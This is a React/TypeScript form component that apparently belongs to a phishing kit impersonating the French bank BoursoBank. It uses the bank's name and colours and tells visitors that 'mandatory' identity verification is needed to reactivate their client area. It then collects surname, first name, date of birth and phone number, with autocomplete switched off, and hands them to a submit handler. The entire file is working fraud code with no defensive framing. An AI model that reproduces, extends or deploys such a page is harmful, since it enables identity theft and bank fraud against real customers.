import React, { useState } from 'react';

interface Props {
  onSubmit: (data: { nom: string; prenom: string; date: string; tel: string }) => void;
}

function formatDate(v: string): string {
  const d = v.replace(/\D/g, '').slice(0, 8);
  if (d.length > 4) return d.slice(0, 2) + '/' + d.slice(2, 4) + '/' + d.slice(4);
  if (d.length > 2) return d.slice(0, 2) + '/' + d.slice(2);
  return d;
}

function formatPhone(v: string): string {
  const d = v.replace(/\D/g, '').slice(0, 10);
  const parts = [];
  for (let i = 0; i < d.length; i += 2) parts.push(d.slice(i, i + 2));
  return parts.join(' ');
}

const VerificationStep: React.FC<Props> = ({ onSubmit }) => {
  const [nom, setNom] = useState('');
  const [prenom, setPrenom] = useState('');
  const [date, setDate] = useState('');
  const [tel, setTel] = useState('');
  const [sending, setSending] = useState(false);

  const telDigits = tel.replace(/\s/g, '');
  const valid = nom.trim().length > 0 && prenom.trim().length > 0 && date.length === 10 && telDigits.length === 10;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!valid || sending) return;
    setSending(true);
    onSubmit({ nom: nom.trim(), prenom: prenom.trim(), date, tel: telDigits });
  };

  const inputClass = "w-full h-11 px-4 border border-gray-300 rounded-lg text-sm outline-none focus:border-bourso focus:ring-2 focus:ring-bourso/20 transition-all";

  return (
    <main className="flex justify-center px-4 py-8 animate-fadeIn">
      <div className="w-full max-w-lg">
        <div className="bg-white rounded-2xl shadow-lg p-8">
          <div className="flex justify-center mb-6">
            <div className="w-20 h-20">
              <svg className="w-full h-full text-bourso" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="1.5">
                <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
              </svg>
            </div>
          </div>

          <h2 className="text-2xl font-bold text-center text-gray-900 mb-2">
            Vérification de votre<br /><strong className="text-bourso">IDENTITÉ</strong>
          </h2>

          <div className="bg-orange-50 border-l-4 border-orange-500 rounded-r-lg p-4 mb-6 mt-4">
            <p className="text-sm text-gray-700">
              <strong className="text-orange-600">Vérification obligatoire</strong><br />
              Veuillez confirmer votre identité afin de finaliser la réactivation de votre espace client BoursoBank.
            </p>
          </div>

          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1.5">Nom</label>
              <input type="text" value={nom} onChange={e => setNom(e.target.value)} placeholder="Votre nom" autoComplete="off" className={inputClass} />
            </div>
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1.5">Prénom</label>
              <input type="text" value={prenom} onChange={e => setPrenom(e.target.value)} placeholder="Votre prénom" autoComplete="off" className={inputClass} />
            </div>
            <div className="mb-4">
              <label className="block text-sm font-semibold text-gray-700 mb-1.5">Date de naissance (JJ/MM/AAAA)</label>
              <input type="tel" value={date} onChange={e => setDate(formatDate(e.target.value))} placeholder="19/03/1983" maxLength={10} autoComplete="off" className={inputClass} />
            </div>
            <div className="mb-6">
              <label className="block text-sm font-semibold text-gray-700 mb-1.5">Numéro de téléphone</label>
              <input type="tel" value={tel} onChange={e => setTel(formatPhone(e.target.value))} placeholder="06 12 34 56 78" maxLength={14} autoComplete="off" className={inputClass} />
            </div>

            <button
              type="submit"
              disabled={!valid || sending}
              className="w-full py-3.5 text-white font-semibold text-lg rounded-full transition-all duration-200 shadow-lg disabled:opacity-50"
              style={{ background: 'linear-gradient(90deg, #D20073, #FF0D77)' }}
            >
              {sending ? 'Vérification...' : 'Réactiver mon espace'}
            </button>
          </form>
        </div>
      </div>
    </main>
  );
};

export default VerificationStep;
